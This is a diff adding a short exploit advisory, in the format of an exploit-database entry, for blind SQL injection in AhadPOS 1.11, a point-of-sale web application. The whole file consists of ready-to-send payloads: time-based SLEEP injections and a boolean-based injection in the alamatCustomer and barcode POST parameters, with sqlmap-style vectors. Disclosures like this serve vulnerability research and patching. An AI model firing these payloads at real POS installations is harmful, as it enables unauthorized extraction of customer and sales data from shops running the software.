@@ -1,0 +1,30 @@
+# Exploit Title: rimbalinux AhadPOS 1.11 - 'alamatCustomer' SQL Injection
+# Date: 2019-11-01
+# Exploit Author: Cakes
+# Vendor Homepage: https://github.com/rimbalinux/AhadPOS
+# Software Link: https://github.com/rimbalinux/AhadPOS.git
+# Version: 1.11
+# Tested on: CentOS 7
+# CVE: N/A
+
+# PoC for time-based and boolean based blind SQL injection
+
+# Parameter: alamatCustomer (POST)
+# Type: time-based blind
+# Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+# Vector: AND (SELECT [RANDNUM] FROM (SELECT(SLEEP([SLEEPTIME]-(IF([INFERENCE],0,[SLEEPTIME])))))[RANDSTR])    
+    
+Payload: namaCustomer=test&alamatCustomer=test'||(SELECT 0x4b686f74 FROM DUAL WHERE 8368=8368 AND (SELECT 9520 FROM (SELECT(SLEEP(5)))gtad))||'&telpCustomer=12312345&keterangan=tester
+
+# Parameter: barcode (POST)
+# Type: boolean-based blind
+# Title: OR boolean-based blind - WHERE or HAVING clause
+# Vector: OR [INFERENCE]    
+    
+Payload: barcode=-3529' OR 4127=4127-- HRDC&jumBarang=1&btnTambah=(t) Tambah
+    
+# Type: time-based blind
+# Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+# Vector: AND (SELECT [RANDNUM] FROM (SELECT(SLEEP([SLEEPTIME]-(IF([INFERENCE],0,[SLEEPTIME])))))[RANDSTR])    
+    
+Payload: barcode=123' AND (SELECT 1256 FROM (SELECT(SLEEP(5)))Nhnk)-- zXsC&jumBarang=1&btnTambah=(t) Tambah
